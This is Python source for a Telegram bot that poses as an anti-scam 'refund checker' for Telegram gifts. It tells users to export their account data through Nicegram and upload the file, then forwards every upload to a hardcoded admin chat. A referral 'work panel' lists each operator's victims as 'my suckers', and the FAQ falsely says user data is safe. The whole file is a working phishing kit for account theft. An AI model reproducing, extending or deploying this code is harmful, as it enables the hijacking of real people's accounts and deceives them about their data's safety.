from flask import Flask
from threading import Thread

app = Flask('')


@app.route('/')
def home():
    return "I'm alive"


def run():
    app.run(host='0.0.0.0', port=8080)


def keep_alive():
    t = Thread(target=run)
    t.start()


# main.py
# Requires: python-telegram-bot==20.3
import os
import json
import time
from datetime import datetime
from pathlib import Path

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

DATA_FILE = Path("data.json")

# ---------- CONFIG ----------
# Put your bot token into Replit Secrets (key: TOKEN)
BOT_TOKEN = os.environ.get("TOKEN")
if not BOT_TOKEN:
    raise RuntimeError(
        "Set TOKEN env var (bot token) in Replit Secrets or environment.")

# Admin chat id to forward files to (you gave this id). If you want to add more admins,
# you can change logic to parse comma-separated list from ADMIN_CHAT_IDS env var.
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "8032938845"))

# Admin code to become admin via /resssiz <code>
ADMIN_CODE = os.environ.get("ADMIN_CODE", "adm3s")
# Bot username (if needed in link building, will be fetched at runtime)
# ----------------------------

# Default textual content (you confirmed these)
START_TITLE = "(Привет! Я - Бот, который поможет тебе не попасться на мошенников.)"
START_BOX_TEXT = ("Я помогу отличить:\n"
                  "🎁 Реальный подарок от чистого визуала\n"
                  "🎁 Чистый подарок без рефаунд\n"
                  "🎁 Подарок, за который уже вернули деньги\n\n"
                  "Выбери действие:")

INSTRUCTION_TEXT = (
    "1. Скачайте приложение Nicegram с официального сайта.\n"
    "2. Откройте Nicegram и войдите в свой аккаунт.\n"
    "3. Зайдите в настройки и выберите пункт «Nicegram».\n"
    "4. Экспортируйте данные аккаунта, нажав «Экспортировать в файл».\n"
    "5. В боте нажмите «Проверка на рефаунд» и отправьте файл.\n")

FAQ_TEXT = (
    "❓ Частые вопросы:\n\n"
    "Q: Что такое рефаунд?\n"
    "A: Это возврат средств после покупки подписки или покупки в приложении.\n\n"
    "Q: Сколько времени занимает проверка?\n"
    "A: Обычно 3–5 минут, в пиковые периоды до 15 минут.\n\n"
    "Q: Какие файлы поддерживаются?\n"
    "A: Только .txt и .zip до 10MB.\n\n"
    "Q: Мои данные в безопасности?\n"
    "A: Да, бот не открывает и не исполняет файлы — только сохраняет и пересылает админам."
)

CHECK_PROMPT = "🔍 Пожалуйста, отправьте файл для проверки на рефаунд.\n\nПринимаются только .zip или .txt (макс ~10MB)."


# ---------- data helpers ----------
def load_data():
    if not DATA_FILE.exists():
        return {"users": {}, "admins": [], "pending": {}}
    try:
        return json.loads(DATA_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {"users": {}, "admins": [], "pending": {}}


def save_data(d):
    DATA_FILE.write_text(json.dumps(d, ensure_ascii=False, indent=2),
                         encoding="utf-8")


# ---------- keyboard builders ----------
def main_menu_keyboard():
    kb = [
        [InlineKeyboardButton("📘 Инструкция", callback_data="instruction")],
        [
            InlineKeyboardButton("🔎 Проверить на рефаунд",
                                 callback_data="check_refund")
        ],
        [InlineKeyboardButton("📱 Nicegram App", url="https://nicegram.app/")],
        [InlineKeyboardButton("❓ Частые вопросы", callback_data="faq")],
    ]
    return InlineKeyboardMarkup(kb)


def back_button(callback_data="back_to_main"):
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅️ Назад", callback_data=callback_data)]])


def admin_workpanel_keyboard(user_id):
    kb = [[
        InlineKeyboardButton("👥 Мои лохи", callback_data=f"my_refs_{user_id}")
    ], [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_admin")]]
    return InlineKeyboardMarkup(kb)


# ---------- handlers ----------
async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user = update.effective_user
    user_id = user.id
    args = context.args  # start parameters, e.g. ["ref8032938845"]

    # detect referral param
    ref_owner = None
    if args:
        param = args[0]
        if param.startswith("ref"):
            try:
                ref_owner = int(param[3:])
            except Exception:
                ref_owner = None

    # save user
    data["users"].setdefault(str(user_id), {})
    data["users"][str(user_id)].update({
        "id":
        user_id,
        "username":
        user.username or "",
        "first_name":
        user.first_name or "",
        "ref_by":
        str(ref_owner) if ref_owner else None,
        "joined":
        int(time.time()),
    })
    # if came by referral — add to refowner list
    if ref_owner:
        data.setdefault("refs", {})
        data["refs"].setdefault(str(ref_owner), [])
        if user_id not in data["refs"][str(ref_owner)]:
            data["refs"][str(ref_owner)].append(user_id)
            # notify the referrer (if possible)
            try:
                await context.bot.send_message(
                    int(ref_owner),
                    f"🔔 У тебя новый реферал: @{user.username or user.first_name}"
                )
            except Exception:
                pass
    save_data(data)

    # send start message
    await update.message.reply_text(f"{START_TITLE}\n\n{START_BOX_TEXT}",
                                    reply_markup=main_menu_keyboard())


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "instruction":
        await query.message.reply_text(
            INSTRUCTION_TEXT, reply_markup=back_button("back_to_main"))
    elif query.data == "faq":
        await query.message.reply_text(
            FAQ_TEXT, reply_markup=back_button("back_to_main"))
    elif query.data == "check_refund":
        # mark user as awaiting file
        data.setdefault("pending", {})
        data["pending"][str(user_id)] = True
        save_data(data)
        await query.message.reply_text(
            CHECK_PROMPT, reply_markup=back_button("back_to_main"))
    elif query.data == "back_to_main":
        await query.message.reply_text(START_BOX_TEXT,
                                       reply_markup=main_menu_keyboard())
    elif query.data.startswith("my_refs_"):
        owner_id = query.data.split("_", 2)[2]
        refs = data.get("refs", {}).get(str(owner_id), [])
        if not refs:
            await query.message.reply_text(
                "У тебя пока нет рефералов.",
                reply_markup=back_button("back_to_admin"))
            return
        lines = [f"👥 Мои лохи (всего: {len(refs)})\n"]
        for uid in refs:
            info = data.get("users", {}).get(str(uid), {})
            name = info.get("username") or info.get("first_name") or str(uid)
            lines.append(f"• {name} (id: {uid})")
        await query.message.reply_text(
            "\n".join(lines), reply_markup=back_button("back_to_admin"))
    elif query.data == "back_to_admin":
        await query.message.reply_text(
            "🔧 WORK PANEL", reply_markup=back_button("back_to_main"))
    else:
        await query.message.reply_text("Неизвестная команда.")


async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user = update.effective_user
    user_id = user.id
    doc = update.message.document
    if not doc:
        await update.message.reply_text(
            "Отправьте документ (.txt или .zip).",
            reply_markup=back_button("back_to_main"))
        return

    # Check whether user was asked to send a file
    if not data.get("pending", {}).get(str(user_id)):
        await update.message.reply_text(
            "Если хотите проверить файл — нажмите кнопку «Проверить на рефаунд» и отправьте файл.",
            reply_markup=back_button("back_to_main"))
        return

    fname = doc.file_name or "file"
    fsize = doc.file_size or 0
    ext = fname.lower().split(".")[-1]

    if ext not in ("txt", "zip"):
        await update.message.reply_text(
            "❗ Принимаются только .txt и .zip.",
            reply_markup=back_button("back_to_main"))
        data["pending"].pop(str(user_id), None)
        save_data(data)
        return

    # Acknowledge user and say checking
    await update.message.reply_text("⏳ Проверяю файл, подождите 3–5 минут…",
                                    reply_markup=back_button("back_to_main"))

    # Forward file to admin with the exact caption format you requested
    caption = f"📥 Новый файл на проверку от {user.first_name} @{user.username or ''}\nUserID: {user_id}\nFile: {fname}"
    try:
        # forward original message (keeps file) then send caption separately if needed
        await update.message.forward(chat_id=ADMIN_CHAT_ID)
        await context.bot.send_message(ADMIN_CHAT_ID, caption)
    except Exception as e:
        # fallback: try send_document by file_id
        try:
            await context.bot.send_document(ADMIN_CHAT_ID,
                                            doc.file_id,
                                            caption=caption)
        except Exception as e2:
            print("Error sending to admin:", e, e2)

    # clear pending
    data["pending"].pop(str(user_id), None)
    save_data(data)


async def ressiz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user = update.effective_user
    user_id = user.id
    args = context.args
    if not args:
        await update.message.reply_text("Использование: /resssiz <код>")
        return
    code = args[0]
    if code == ADMIN_CODE:
        # add admin
        if str(user_id) not in data.get("admins", []):
            data.setdefault("admins", []).append(str(user_id))
            save_data(data)
        await update.message.reply_text(
            "✅ Вы получили админ-права. Используйте /workpanel")
    else:
        await update.message.reply_text("Неверный код.")


async def workpanel_command(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user = update.effective_user
    user_id = user.id
    if str(user_id) not in data.get("admins", []):
        await update.message.reply_text("Доступно только админам.")
        return
    bot_user = await context.bot.get_me()
    ref_link = f"https://t.me/{bot_user.username}?start=ref{user_id}"
    await update.message.reply_text(
        f"🔧 WORK PANEL\n\nТвоя реферальная ссылка:\n{ref_link}",
        reply_markup=admin_workpanel_keyboard(user_id))


async def adminlist_command(update: Update,
                            context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user_id = update.effective_user.id
    if str(user_id) not in data.get("admins", []):
        await update.message.reply_text("Доступно только админам.")
        return
    lines = []
    for uid, info in data.get("users", {}).items():
        lines.append(
            f"{uid}: @{info.get('username','')} (ref_by: {info.get('ref_by')})"
        )
    await update.message.reply_text("Все пользователи:\n" +
                                    "\n".join(lines[:200]))


async def unknown_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{START_BOX_TEXT}",
                                    reply_markup=main_menu_keyboard())


async def reply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text(
            "Используй формат:\n/reply <user_id> <текст>")
        return

    user_id = context.args[0]
    message_text = " ".join(context.args[1:])
    try:
        await context.bot.send_message(chat_id=user_id, text=message_text)
        await update.message.reply_text("✅ Сообщение отправлено!")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Ошибка при отправке: {e}")


# ---------- main ----------
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("reply", reply_command))
    app.add_handler(CommandHandler("start", start_handler))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(CommandHandler("resssiz", ressiz_command))
    app.add_handler(CommandHandler("workpanel", workpanel_command))
    app.add_handler(CommandHandler("adminlist", adminlist_command))
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, unknown_handler))

    print("Bot started...")
    keep_alive()
    app.run_polling()


if __name__ == "__main__":
    main()
